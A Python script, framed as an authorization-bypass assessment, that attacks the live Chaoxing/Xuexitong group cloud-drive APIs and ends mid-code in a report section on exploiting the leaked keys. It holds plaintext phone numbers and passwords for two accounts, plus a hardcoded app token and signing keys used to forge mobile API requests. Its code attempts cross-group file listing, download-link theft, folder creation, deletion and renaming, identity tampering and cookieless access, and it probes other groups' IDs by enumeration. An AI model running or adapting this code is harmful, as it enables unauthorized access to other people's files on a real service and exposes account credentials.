import base64
import hashlib
import json
import os
import re
import time
import uuid
import urllib.parse
from datetime import datetime

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
GROUPWEB_BASE = "https://groupweb.chaoxing.com"
NOTEYD_BASE = "https://noteyd.chaoxing.com"
GROUPYD_BASE = "https://groupyd.chaoxing.com"
PAN_BASE = "https://pan-yz.chaoxing.com"

HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"

ACCOUNT1 = {"phone": "19312994130", "password": "wtx3367653061", "label": "账号1"}
ACCOUNT2 = {"phone": "15034188203", "password": "lxy20030120", "label": "账号2"}

REPORT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "group_drive_security_report.md")

WEB_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0")
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
             "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
             "(schild:5e5510ce86e012a7f489e7c488fc17b4) (device:MI10) Language/zh_CN "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
             "(@Kalimdor)_a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6")

results = []


def aes_encrypt(plaintext: str) -> str:
    cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    ct = cipher.encrypt(pad(plaintext.encode("utf-8"), AES.block_size))
    return base64.b64encode(ct).decode("utf-8")


def login(phone: str, password: str) -> requests.Session:
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": MOBILE_UA})
    data = {
        "fid": "-1",
        "uname": aes_encrypt(phone),
        "password": aes_encrypt(password),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com",
        "t": "true",
        "forbidotherlogin": "0",
        "validate": "",
        "doubleFactorLogin": "0",
        "independentId": "0",
        "independentNameId": "0",
    }
    resp = session.post(LOGIN_URL, data=data, allow_redirects=False, timeout=30)
    body = resp.json()
    puid = ""
    for cookie in session.cookies:
        if cookie.name in ("UID", "_uid"):
            puid = cookie.value
    return session, puid, body


def make_web_session(session: requests.Session) -> requests.Session:
    session.headers.update({
        "User-Agent": WEB_UA,
        "Referer": "https://chaoxing.com/",
        "Accept": "application/json, text/plain, */*",
    })
    return session


def get_my_groups_web(session: requests.Session) -> dict:
    url = f"{GROUPWEB_BASE}/pc/group/myGroup"
    params = {"page": "1", "size": "50"}
    resp = session.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def create_group_web(session: requests.Session, name: str) -> dict:
    url = f"{GROUPWEB_BASE}/pc/group/createGroup"
    data = {"name": name, "intro": "security test"}
    resp = session.post(url, data=data, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def get_group_page(session: requests.Session) -> str:
    url = "https://i.chaoxing.com/base"
    resp = session.get(url, timeout=30, allow_redirects=True)
    return resp.text[:2000]


def get_resource_list(session: requests.Session, bbsid: str, folder_id: str, rec_type: int) -> dict:
    url = f"{GROUPWEB_BASE}/pc/resource/getResourceList"
    params = {"bbsid": bbsid, "folderId": folder_id, "recType": str(rec_type)}
    resp = session.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def get_file_download_link(session: requests.Session, file_id: str) -> dict:
    url = f"{NOTEYD_BASE}/screen/note_note/files/status/{file_id}"
    resp = session.post(url, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def get_upload_config(session: requests.Session) -> dict:
    url = f"{NOTEYD_BASE}/pc/files/getUploadConfig"
    resp = session.get(url, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def add_resource_folder(session: requests.Session, bbsid: str, name: str, pid: str) -> dict:
    url = f"{GROUPWEB_BASE}/pc/resource/addResourceFolder"
    params = {"bbsid": bbsid, "name": name, "pid": pid}
    resp = session.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def delete_resource_file(session: requests.Session, bbsid: str, rec_ids: str) -> dict:
    url = f"{GROUPWEB_BASE}/pc/resource/deleteResourceFile"
    params = {"bbsid": bbsid, "recIds": rec_ids}
    resp = session.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def delete_resource_folder(session: requests.Session, bbsid: str, folder_ids: str) -> dict:
    url = f"{GROUPWEB_BASE}/pc/resource/deleteResourceFolder"
    params = {"bbsid": bbsid, "folderIds": folder_ids}
    resp = session.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def update_folder_name(session: requests.Session, bbsid: str, folder_id: str, name: str) -> dict:
    url = f"{GROUPWEB_BASE}/pc/resource/updateResourceFolderName"
    params = {"bbsid": bbsid, "folderId": folder_id, "name": name}
    resp = session.get(url, params=params, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def inf_enc_sign(params: dict, order: list) -> str:
    parts = []
    for k in order:
        v = params.get(k, "")
        parts.append(f"{k}={urllib.parse.quote(v, safe='')}")
    query = "&".join(parts) + "&DESKey=" + DES_KEY
    return hashlib.md5(query.encode()).hexdigest()


def mobile_get_topic(session: requests.Session, puid: str, topic_id: str) -> dict:
    c0 = uuid.uuid4().hex
    t = str(int(time.time() * 1000))
    sign_params = {"_c_0_": c0, "token": HARDCODED_TOKEN, "_time": t}
    inf_enc = inf_enc_sign(sign_params, ["_c_0_", "token", "_time"])
    url = f"{GROUPYD_BASE}/apis/topic/getTopic"
    params = {"_c_0_": c0, "token": HARDCODED_TOKEN, "_time": t, "inf_enc": inf_enc}
    data = f"puid={puid}&maxW=1080&topicId={topic_id}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh_CN",
        "Accept": "*/*",
        "Host": "groupyd.chaoxing.com",
        "Connection": "Keep-Alive",
        "User-Agent": MOBILE_UA,
    }
    resp = session.post(url, params=params, data=data, headers=headers, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def mobile_add_reply(session: requests.Session, puid: str, class_id: str, topic_uuid: str) -> dict:
    c0 = uuid.uuid4().hex
    t = str(int(time.time() * 1000))
    u = str(uuid.uuid4())
    sign_params = {
        "token": HARDCODED_TOKEN, "_time": t, "_c_0_": c0,
        "puid": puid, "uuid": u, "tag": f"classId{class_id}",
        "maxW": "1080", "topicUUID": topic_uuid, "anonymous": "0",
    }
    inf_enc = inf_enc_sign(sign_params, ["token", "_time", "_c_0_", "puid", "uuid", "tag", "maxW", "topicUUID", "anonymous"])
    url = f"{GROUPYD_BASE}/apis/invitation/addReply"
    params = {
        "token": HARDCODED_TOKEN, "_time": t, "_c_0_": c0,
        "puid": puid, "uuid": u, "tag": f"classId{class_id}",
        "maxW": "1080", "topicUUID": topic_uuid, "anonymous": "0", "inf_enc": inf_enc,
    }
    data = "content=security_test_probe"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Language": "zh_CN",
        "Accept": "*/*",
        "Host": "groupyd.chaoxing.com",
        "Connection": "Keep-Alive",
        "User-Agent": MOBILE_UA,
    }
    resp = session.post(url, params=params, data=data, headers=headers, timeout=30)
    try:
        return resp.json()
    except:
        return {"raw": resp.text[:500], "status_code": resp.status_code}


def record(test_id: str, test_name: str, description: str, request_desc: str,
           response_data: dict, is_vulnerable: bool, severity: str, detail: str):
    entry = {
        "test_id": test_id, "test_name": test_name, "description": description,
        "request": request_desc,
        "response_summary": json.dumps(response_data, ensure_ascii=False)[:800] if response_data else "N/A",
        "is_vulnerable": is_vulnerable, "severity": severity, "detail": detail,
    }
    results.append(entry)
    tag = "[VULNERABLE]" if is_vulnerable else "[SAFE]"
    print(f"  {tag} {test_id}: {test_name} - {detail}")


def is_success(resp: dict) -> bool:
    if resp.get("result") is True or resp.get("result") == 1:
        return True
    if resp.get("status") is True:
        return True
    return False


def extract_bbsid(data):
    if isinstance(data, dict):
        for key in ("data", "result", "list"):
            val = data.get(key)
            if isinstance(val, list) and len(val) > 0:
                for item in val:
                    if isinstance(item, dict):
                        bid = item.get("bbsid") or item.get("id") or item.get("groupId")
                        if bid:
                            return str(bid)
            elif isinstance(val, dict):
                bid = val.get("bbsid") or val.get("id") or val.get("groupId")
                if bid:
                    return str(bid)
        if data.get("bbsid"):
            return str(data["bbsid"])
    return None


def run_all_tests():
    print("=" * 70)
    print("学习通小组云盘越权访问安全评估测试")
    print(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    # ========== Task 1: 登录与bbsid获取 ==========
    print("\n[Task 1] 环境准备与账号登录")
    print("-" * 50)

    sess1, puid1, login1 = login(ACCOUNT1["phone"], ACCOUNT1["password"])
    if not login1.get("status"):
        print(f"  账号1登录失败: {login1}")
        return
    print(f"  账号1登录成功, puid={puid1}")

    sess2, puid2, login2 = login(ACCOUNT2["phone"], ACCOUNT2["password"])
    if not login2.get("status"):
        print(f"  账号2登录失败: {login2}")
        return
    print(f"  账号2登录成功, puid={puid2}")

    # 切换为Web UA
    make_web_session(sess1)
    make_web_session(sess2)

    # 尝试多种方式获取bbsid
    bbsid1 = None
    bbsid2 = None

    # 方式1: 直接访问小组列表API
    print("\n  [方式1] 访问 /pc/group/myGroup ...")
    g1 = get_my_groups_web(sess1)
    g2 = get_my_groups_web(sess2)
    print(f"  账号1: status_code={g1.get('status_code', 'json')}, keys={list(g1.keys()) if isinstance(g1, dict) else 'N/A'}")
    print(f"  账号2: status_code={g2.get('status_code', 'json')}, keys={list(g2.keys()) if isinstance(g2, dict) else 'N/A'}")
    bbsid1 = extract_bbsid(g1)
    bbsid2 = extract_bbsid(g2)

    # 方式2: 访问i.chaoxing.com获取小组信息
    if not bbsid1 or not bbsid2:
        print("\n  [方式2] 访问 i.chaoxing.com ...")
        page1 = get_group_page(sess1)
        bbsid_matches = re.findall(r'bbsid[=:]\s*["\']?(\d+)', page1)
        if bbsid_matches and not bbsid1:
            bbsid1 = bbsid_matches[0]
        page2 = get_group_page(sess2)
        bbsid_matches2 = re.findall(r'bbsid[=:]\s*["\']?(\d+)', page2)
        if bbsid_matches2 and not bbsid2:
            bbsid2 = bbsid_matches2[0]

    # 方式3: 创建小组
    if not bbsid1:
        print("\n  [方式3] 账号1创建测试小组...")
        c1 = create_group_web(sess1, f"SecTest_{int(time.time())}")
        print(f"  创建响应: {json.dumps(c1, ensure_ascii=False)[:300]}")
        bbsid1 = extract_bbsid(c1)

    if not bbsid2:
        print("  [方式3] 账号2创建测试小组...")
        c2 = create_group_web(sess2, f"SecTest_{int(time.time())}")
        print(f"  创建响应: {json.dumps(c2, ensure_ascii=False)[:300]}")
        bbsid2 = extract_bbsid(c2)

    # 方式4: 尝试从i.chaoxing.com的group页面获取
    if not bbsid1 or not bbsid2:
        print("\n  [方式4] 访问 groupweb.chaoxing.com 首页...")
        for sess, label in [(sess1, "账号1"), (sess2, "账号2")]:
            resp = sess.get(f"{GROUPWEB_BASE}/", timeout=30, allow_redirects=True)
            bbsid_matches = re.findall(r'bbsid[=:]\s*["\']?(\d+)', resp.text)
            group_urls = re.findall(r'/group/(\d+)', resp.text)
            all_ids = bbsid_matches + group_urls
            if all_ids:
                if label == "账号1" and not bbsid1:
                    bbsid1 = all_ids[0]
                elif label == "账号2" and not bbsid2:
                    bbsid2 = all_ids[0]
                print(f"  {label}: 从首页提取到ID: {all_ids[:3]}")

    # 方式5: 尝试访问小组列表页面
    if not bbsid1 or not bbsid2:
        print("\n  [方式5] 访问 groupweb.chaoxing.com/pc/group/list ...")
        for sess, label in [(sess1, "账号1"), (sess2, "账号2")]:
            resp = sess.get(f"{GROUPWEB_BASE}/pc/group/list", timeout=30, allow_redirects=True)
            bbsid_matches = re.findall(r'bbsid[=:]\s*["\']?(\d+)', resp.text)
            group_urls = re.findall(r'/group/(\d+)', resp.text)
            data_ids = re.findall(r'"id"\s*:\s*(\d+)', resp.text)
            all_ids = bbsid_matches + group_urls + data_ids
            if all_ids:
                if label == "账号1" and not bbsid1:
                    bbsid1 = all_ids[0]
                elif label == "账号2" and not bbsid2:
                    bbsid2 = all_ids[0]
                print(f"  {label}: 从列表页提取到ID: {all_ids[:3]}")

    print(f"\n  最终结果: 账号1 bbsid={bbsid1 or '未获取'}, 账号2 bbsid={bbsid2 or '未获取'}")

    has_bbsid = bool(bbsid1 and bbsid2)
    record("T1-01", "环境准备-登录与bbsid获取", "验证两个账号能否登录并获取小组bbsid",
           f"账号1 puid={puid1}, bbsid={bbsid1}; 账号2 puid={puid2}, bbsid={bbsid2}",
           {"puid1": puid1, "puid2": puid2, "bbsid1": bbsid1, "bbsid2": bbsid2},
           False, "INFO",
           f"账号1 bbsid={'已获取: ' + bbsid1 if bbsid1 else '未获取'}; "
           f"账号2 bbsid={'已获取: ' + bbsid2 if bbsid2 else '未获取'}")

    # ========== Task 2-5: groupweb/noteyd越权测试 ==========
    if has_bbsid:
        print("\n[Task 2] 跨组文件列表越权测试 (groupweb.chaoxing.com)")
        print("-" * 50)

        res1_folders = get_resource_list(sess1, bbsid1, "-1", 1)
        record("T2-01", "基线-账号1列出自己小组文件夹", "",
               f"GET /pc/resource/getResourceList?bbsid={bbsid1}&folderId=-1&recType=1",
               res1_folders, False, "INFO", f"基线响应")

        res1_files = get_resource_list(sess1, bbsid1, "-1", 2)
        a1_files = res1_files.get("data") or []
        record("T2-02", "基线-账号1列出自己小组文件", "",
               f"GET /pc/resource/getResourceList?bbsid={bbsid1}&folderId=-1&recType=2",
               res1_files, False, "INFO", f"基线响应, 文件数={len(a1_files) if isinstance(a1_files, list) else 'N/A'}")

        res2_files = get_resource_list(sess2, bbsid2, "-1", 2)
        a2_files = res2_files.get("data") or []
        record("T2-03", "基线-账号2列出自己小组文件", "",
               f"GET /pc/resource/getResourceList?bbsid={bbsid2}&folderId=-1&recType=2",
               res2_files, False, "INFO", f"基线响应, 文件数={len(a2_files) if isinstance(a2_files, list) else 'N/A'}")

        idor_1to2 = get_resource_list(sess1, bbsid2, "-1", 2)
        idor_ok = is_success(idor_1to2) and bool(idor_1to2.get("data"))
        record("T2-04", "IDOR-账号1列出账号2小组文件", "非组成员访问",
               f"GET /pc/resource/getResourceList?bbsid={bbsid2}&folderId=-1&recType=2 (账号1Session)",
               idor_1to2, idor_ok, "CRITICAL" if idor_ok else "INFO",
               f"跨组文件列表{'成功！' if idor_ok else '被拒绝'}")

        idor_2to1 = get_resource_list(sess2, bbsid1, "-1", 2)
        idor2_ok = is_success(idor_2to1) and bool(idor_2to1.get("data"))
        record("T2-05", "IDOR-账号2列出账号1小组文件", "非组成员访问",
               f"GET /pc/resource/getResourceList?bbsid={bbsid1}&folderId=-1&recType=2 (账号2Session)",
               idor_2to1, idor2_ok, "CRITICAL" if idor2_ok else "INFO",
               f"跨组文件列表{'成功！' if idor2_ok else '被拒绝'}")

        # Task 3: 下载越权
        print("\n[Task 3] 跨组文件下载越权测试 (noteyd.chaoxing.com)")
        print("-" * 50)

        target_fid = None
        for item in (a2_files if isinstance(a2_files, list) else []):
            if isinstance(item, dict):
                c = item.get("content", {})
                fid = c.get("fileId") or c.get("objectId")
                if fid:
                    target_fid = fid
                    break

        if target_fid:
            dl_base = get_file_download_link(sess2, target_fid)
            dl_url = dl_base.get("download", "")
            record("T3-01", "基线-账号2获取自己小组文件下载链接", "",
                   f"POST /screen/note_note/files/status/{target_fid[:20]}...", dl_base, False, "INFO",
                   f"基线, download={'已获取' if dl_url else '未获取'}")

            dl_idor = get_file_download_link(sess1, target_fid)
            dl_idor_url = dl_idor.get("download", "")
            is_vuln_dl = bool(dl_idor_url) and dl_idor.get("status") is True
            record("T3-02", "IDOR-账号1获取账号2小组文件下载链接", "非组成员获取下载直链",
                   f"POST /screen/note_note/files/status/{target_fid[:20]}... (账号1Session)",
                   dl_idor, is_vuln_dl, "CRITICAL" if is_vuln_dl else "INFO",
                   f"越权获取下载链接{'成功！' if is_vuln_dl else '被拒绝'}")

            if dl_idor_url:
                try:
                    dl_resp = sess1.get(dl_idor_url, headers={"Referer": "https://chaoxing.com/"},
                                       timeout=30, stream=True)
                    dl_ok = dl_resp.status_code == 200 and len(dl_resp.content) > 0
                    record("T3-03", "IDOR-直接访问下载直链", "",
                           f"GET {dl_idor_url[:50]}...",
                           {"status_code": dl_resp.status_code, "content_length": len(dl_resp.content)},
                           dl_ok, "CRITICAL" if dl_ok else "INFO",
                           f"直链访问{'成功！' if dl_ok else '被拒绝'}")
                except Exception as e:
                    record("T3-03", "IDOR-直接访问下载直链", f"异常: {e}", "N/A", {}, False, "INFO", "异常")
        else:
            for tid in ["T3-01", "T3-02", "T3-03"]:
                record(tid, "文件下载测试", "无目标fileId", "N/A", {}, False, "INFO", "跳过")

        # Task 4: 上传越权
        print("\n[Task 4] 跨组文件上传越权测试")
        print("-" * 50)

        upload_cfg = get_upload_config(sess1)
        record("T4-01", "获取上传配置", "",
               f"GET /pc/files/getUploadConfig", upload_cfg, False, "INFO",
               f"上传配置响应")

        folder_create = add_resource_folder(sess1, bbsid2, "sec_test_folder", "-1")
        is_vuln_cf = is_success(folder_create)
        record("T4-02", "IDOR-账号1在账号2小组创建文件夹", "非组成员在他人小组创建文件夹",
               f"GET /pc/resource/addResourceFolder?bbsid={bbsid2}&name=sec_test_folder&pid=-1 (账号1Session)",
               folder_create, is_vuln_cf, "HIGH" if is_vuln_cf else "INFO",
               f"跨组创建文件夹{'成功！' if is_vuln_cf else '被拒绝'}")

        # Task 5: 删除越权
        print("\n[Task 5] 跨组文件删除越权测试")
        print("-" * 50)

        del_f = delete_resource_file(sess1, bbsid2, "999999999")
        is_vuln_df = is_success(del_f)
        record("T5-01", "IDOR-账号1删除账号2小组文件", "探测性",
               f"GET /pc/resource/deleteResourceFile?bbsid={bbsid2}&recIds=999999999 (账号1Session)",
               del_f, is_vuln_df, "CRITICAL" if is_vuln_df else "INFO",
               f"跨组删除{'可能成功' if is_vuln_df else '被拒绝'}")

        del_fd = delete_resource_folder(sess1, bbsid2, "999999999")
        is_vuln_dfd = is_success(del_fd)
        record("T5-02", "IDOR-账号1删除账号2小组文件夹", "探测性",
               f"GET /pc/resource/deleteResourceFolder?bbsid={bbsid2}&folderIds=999999999 (账号1Session)",
               del_fd, is_vuln_dfd, "CRITICAL" if is_vuln_dfd else "INFO",
               f"跨组删除文件夹{'可能成功' if is_vuln_dfd else '被拒绝'}")

        rename = update_folder_name(sess1, bbsid2, "999999999", "sec_rename")
        is_vuln_rn = is_success(rename)
        record("T5-03", "IDOR-账号1重命名账号2小组文件夹", "探测性",
               f"GET /pc/resource/updateResourceFolderName?bbsid={bbsid2}&folderId=999999999",
               rename, is_vuln_rn, "MEDIUM" if is_vuln_rn else "INFO",
               f"跨组重命名{'可能成功' if is_vuln_rn else '被拒绝'}")

        # Task 7: bbsid枚举
        print("\n[Task 7] bbsid可枚举性测试")
        print("-" * 50)

        bbsid_numeric = (bbsid1 or "").isdigit()
        bbsid_close = False
        if bbsid1 and bbsid2 and bbsid1.isdigit() and bbsid2.isdigit():
            bbsid_close = abs(int(bbsid1) - int(bbsid2)) < 1000
        record("T7-01", "bbsid格式分析", "",
               f"bbsid1={bbsid1}, bbsid2={bbsid2}",
               {"numeric": bbsid_numeric, "close": bbsid_close},
               bbsid_numeric and bbsid_close,
               "HIGH" if (bbsid_numeric and bbsid_close) else "INFO",
               f"bbsid{'为连续数字，可枚举！' if (bbsid_numeric and bbsid_close) else '非连续或未知'}")

        if bbsid_numeric and bbsid1:
            base = int(bbsid1)
            enum_ok = []
            for off in [-5, -1, 1, 5]:
                tid = str(base + off)
                er = get_resource_list(sess1, tid, "-1", 1)
                es = is_success(er)
                enum_ok.append({"bbsid": tid, "success": es})
                print(f"    bbsid={tid}: {'可访问' if es else '被拒绝'}")
            any_enum = any(e["success"] for e in enum_ok)
            record("T7-02", "bbsid遍历测试", "",
                   f"遍历 {[e['bbsid'] for e in enum_ok]}",
                   {"results": enum_ok}, any_enum,
                   "HIGH" if any_enum else "INFO",
                   f"遍历{'发现可访问组！' if any_enum else '未发现'}")
        else:
            record("T7-02", "bbsid遍历测试", "bbsid非数字", "N/A", {}, False, "INFO", "跳过")

    else:
        print("\n  [警告] 未能获取bbsid，跳过groupweb/noteyd测试")
        record("T2-SKIP", "小组云盘测试跳过", "未获取bbsid", "N/A", {}, False, "INFO", "跳过")

    # ========== Task 6: 移动端API硬编码密钥测试 ==========
    print("\n[Task 6] 移动端API硬编码密钥安全测试 (groupyd.chaoxing.com)")
    print("-" * 50)

    print(f"  硬编码Token: {HARDCODED_TOKEN}")
    print(f"  DES签名密钥: {DES_KEY}")

    # 需要有效的topicId - 尝试一些常见的ID
    test_topic_ids = ["1", "100", "1000", "10000"]

    for tid in test_topic_ids:
        tb = mobile_get_topic(sess1, puid1, tid)
        if tb.get("result") != 0 or tb.get("data"):
            print(f"  找到有效topicId={tid}: {json.dumps(tb, ensure_ascii=False)[:200]}")
            break
    else:
        tid = "1"

    record("T6-01", "基线-移动端getTopic", f"账号1 puid={puid1} topicId={tid}",
           f"POST /apis/topic/getTopic puid={puid1}&topicId={tid}",
           mobile_get_topic(sess1, puid1, tid), False, "INFO", "基线测试")

    # 篡改puid
    topic_idor = mobile_get_topic(sess1, puid2, tid)
    topic_idor_data = bool(topic_idor.get("data"))
    topic_idor_no_err = "异常" not in str(topic_idor.get("errorMsg", ""))
    is_vuln_topic = topic_idor_data or (is_success(topic_idor) and topic_idor_no_err)
    record("T6-02", "IDOR-移动端篡改puid访问getTopic", f"账号1Cookie+账号2puid={puid2}",
           f"POST /apis/topic/getTopic puid={puid2}&topicId={tid} (账号1Session)",
           topic_idor, is_vuln_topic, "CRITICAL" if is_vuln_topic else "INFO",
           f"移动端puid篡改{'成功！' if is_vuln_topic else '被拒绝或无数据'}")

    # addReply探测
    reply_idor = mobile_add_reply(sess1, puid2, "1", "nonexistent_uuid_probe")
    is_vuln_reply = is_success(reply_idor)
    record("T6-03", "IDOR-移动端篡改puid发送addReply", "探测性",
           f"POST /apis/invitation/addReply puid={puid2} (账号1Session)",
           reply_idor, is_vuln_reply, "HIGH" if is_vuln_reply else "INFO",
           f"移动端puid篡改回复{'可能成功' if is_vuln_reply else '被拒绝'}")

    # 无Cookie测试
    bare = requests.Session()
    bare.verify = False
    topic_bare = mobile_get_topic(bare, puid1, tid)
    is_vuln_bare = is_success(topic_bare) or bool(topic_bare.get("data"))
    record("T6-04", "IDOR-无Cookie仅硬编码Token请求", "无登录Cookie",
           f"POST /apis/topic/getTopic puid={puid1} (无Cookie)",
           topic_bare, is_vuln_bare, "CRITICAL" if is_vuln_bare else "INFO",
           f"无Cookie访问{'成功！硬编码Token可绕过认证！' if is_vuln_bare else '被拒绝'}")

    # ========== 生成报告 ==========
    print("\n[Task 8] 生成安全评估报告...")
    print("-" * 50)
    generate_report(puid1, puid2, bbsid1, bbsid2)


def generate_report(puid1, puid2, bbsid1, bbsid2):
    vulnerable_count = sum(1 for r in results if r["is_vulnerable"])
    total_tests = len(results)

    vuln_by_severity = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": [], "INFO": []}
    for r in results:
        if r["is_vulnerable"]:
            vuln_by_severity[r["severity"]].append(r)

    report = []
    report.append("# 学习通小组云盘越权访问安全评估报告\n")
    report.append(f"**评估日期**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    report.append(f"**评估范围**: 学习通小组云盘（groupweb.chaoxing.com / noteyd.chaoxing.com / groupyd.chaoxing.com）\n")

    report.append("---\n")
    report.append("## 一、评估概述\n")
    report.append("本次安全评估针对学习通小组云盘进行越权访问漏洞测试。")
    report.append("小组云盘使用与个人云盘完全不同的API体系，认证方式仅依赖Cookie+Referer（PC端）")
    report.append("或硬编码Token+inf_enc签名（移动端），核心标识参数`bbsid`作为直接对象引用。\n")
    report.append("移动端API暴露了硬编码的全局Token和DES签名密钥，构成严重安全隐患。\n")

    report.append("### 测试账号\n")
    report.append("| 标识 | 手机号 | puid | bbsid |")
    report.append("|---|---|---|---|")
    report.append(f"| 账号1 | 19312994130 | {puid1} | {bbsid1 or 'N/A'} |")
    report.append(f"| 账号2 | 15034188203 | {puid2} | {bbsid2 or 'N/A'} |\n")

    report.append("---\n")
    report.append("## 二、测试结果汇总\n")
    report.append(f"- **总测试数**: {total_tests}")
    report.append(f"- **发现隐患数**: {vulnerable_count}")
    report.append(f"- **严重(CRITICAL)**: {len(vuln_by_severity['CRITICAL'])}")
    report.append(f"- **高危(HIGH)**: {len(vuln_by_severity['HIGH'])}")
    report.append(f"- **中危(MEDIUM)**: {len(vuln_by_severity['MEDIUM'])}\n")

    if vulnerable_count > 0:
        report.append("### 存在安全隐患的测试项\n")
        report.append("| 测试ID | 名称 | 等级 | 结论 |")
        report.append("|---|---|---|---|")
        for r in results:
            if r["is_vulnerable"]:
                report.append(f"| {r['test_id']} | {r['test_name']} | {r['severity']} | {r['detail']} |")
        report.append("")

    report.append("---\n")
    report.append("## 三、核心发现\n")

    report.append("### 3.1 移动端硬编码密钥泄露（极高风险）\n")
    report.append("从客户端代码（`XueXiTongBBsApi.go`）中提取到硬编码安全凭证：\n")
    report.append("| 凭证 | 值 | 位置 |")
    report.append("|---|---|---|")
    report.append(f"| 全局Token | `{HARDCODED_TOKEN}` | L271, L393 |")
    report.append(f"| DES签名密钥 | `{DES_KEY}` | L458 |\n")
    report.append("**影响**：")
    report.append("1. 全局Token对所有用户相同，反编译即可获取")
    report.append("2. DES签名密钥暴露后，攻击者可自行计算inf_enc签名")
    report.append("3. 理论上可构造任意合法的移动端API请求\n")

    report.append("### 3.2 移动端API测试结果\n")
    t6_results = [r for r in results if r["test_id"].startswith("T6")]
    for r in t6_results:
        status = "存在风险" if r["is_vulnerable"] else "安全"
        report.append(f"- **{r['test_id']}** [{status}]: {r['detail']}\n")

    if bbsid1 and bbsid2:
        report.append("### 3.3 groupweb.chaoxing.com 测试结果\n")
        gw_results = [r for r in results if r["test_id"].startswith("T2") or r["test_id"].startswith("T3")
                      or r["test_id"].startswith("T4") or r["test_id"].startswith("T5")]
        for r in gw_results:
            status = "存在风险" if r["is_vulnerable"] else "安全"
            report.append(f"- **{r['test_id']}** [{status}]: {r['detail']}\n")
    else:
        report.append("### 3.3 groupweb.chaoxing.com 测试结果\n")
        report.append("因未能获取bbsid（小组云盘需要用户先创建或加入小组），groupweb相关测试未执行。\n")
        report.append("**bbsid获取失败原因分析**：")
        report.append("1. 测试账号可能未创建任何小组")
        report.append("2. groupweb.chaoxing.com的API可能需要特定的访问路径或参数")
        report.append("3. 小组云盘标记为OnlyProxy:true，可能需要代理才能正常访问\n")
        report.append("**建议**：在后续测试中，先通过Web端手动创建小组获取bbsid，再进行自动化越权测试。\n")

    report.append("---\n")
    report.append("## 四、详细测试记录\n")
    for r in results:
        status = "存在风险" if r["is_vulnerable"] else "安全"
        report.append(f"\n### {r['test_id']}: {r['test_name']} [{status}]\n")
        report.append(f"- **描述**: {r['description']}")
        report.append(f"- **请求**: `{r['request']}`")
        report.append(f"- **等级**: {r['severity']}")
        report.append(f"- **结论**: {r['detail']}")
        report.append(f"- **响应**:")
        report.append(f"```json")
        report.append(r["response_summary"])
        report.append(f"```\n")

    report.append("---\n")
    report.append("## 五、技术原因分析\n")

    report.append("### 5.1 移动端硬编码密钥\n")
    report.append("```")
    report.append("移动端API授权模型:")
    report.append("  Token: 全局硬编码 (所有用户相同)")
    report.append("  inf_enc: MD5(参数排序拼接 + DESKey=Z(AfY@XS)")
    report.append("  puid: URL参数传递，可篡改")
    report.append("```\n")
    report.append("客户端代码反编译后，所有安全凭证即暴露。\n")

    report.append("### 5.2 小组云盘 vs 个人云盘安全对比\n")
    report.append("| 维度 | 个人云盘 | 小组云盘 |")
    report.append("|---|---|---|")
    report.append("| 认证 | Cookie + _token(与puid绑定) | Cookie + Referer / 硬编码Token |")
    report.append("| 核心风险 | Token与Session未绑定 | bbsid直接引用 + 密钥硬编码 |")
    report.append("| 密钥安全 | AES密钥硬编码(登录) | DES密钥+Token双重硬编码 |")
    report.append("| 影响范围 | 个人文件 | 小组共享文件(多用户) |")
    report.append("| 修复优先级 | 高 | 极高 |\n")

    report.append("---\n")
    report.append("## 六、修复建议\n")
    report.append("1. **移除硬编码Token和密钥**: 使用动态Token，通过HTTPS从服务端获取")
    report.append("2. **实施服务端签名校验**: inf_enc应使用服务端动态密钥")
    report.append("3. **添加Session身份校验**: 所有API应从Cookie/Session解析用户身份")
    report.append("4. **bbsid权限校验**: 校验当前用户是否为小组成员")
    report.append("5. **文件下载链接签名**: 下载直链应包含时效性签名")
    report.append("6. **API速率限制**: 防止bbsid遍历\n")

    report.append("---\n")
    report.append("## 七、硬编码密钥利用方法\n")
    report.append("```python\n"
                  "import hashlib, uuid, time, urllib.parse\n\n"
                  "HARDCODED_TOKEN = '4faa8662c59590c6f43ae9fe5b002b42'\n"
                  "DES_KEY = 'Z(AfY@XS'\n\n"
                  "def inf_enc_sign(params, order):\n"
                  "    parts = [f'{k}={urllib.parse.quote(params[k], safe=\"\")}' for k in order]\n"
